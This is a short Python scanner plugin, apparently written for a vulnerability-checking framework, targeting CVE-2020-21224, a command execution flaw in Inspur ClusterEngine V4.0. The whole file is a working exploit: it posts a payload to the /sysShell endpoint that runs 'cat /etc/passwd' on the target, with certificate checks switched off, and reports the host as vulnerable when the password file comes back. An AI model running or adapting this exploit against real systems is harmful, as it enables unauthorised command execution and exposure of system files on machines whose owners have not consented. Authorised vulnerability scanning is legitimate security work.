#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   '浪潮ClusterEngineV4.0 sysShell 任意命令执行 CVE-2020-21224',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Accept-Encoding': 'gzip, deflate',
      'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
      'Cookie': 'lang=cn',
      }
  target = '/sysShell'
  data = 'op=doPlease&node=cu01&command=cat /etc/passwd'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if res.status_code == 200 and "root:" in res.text:
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret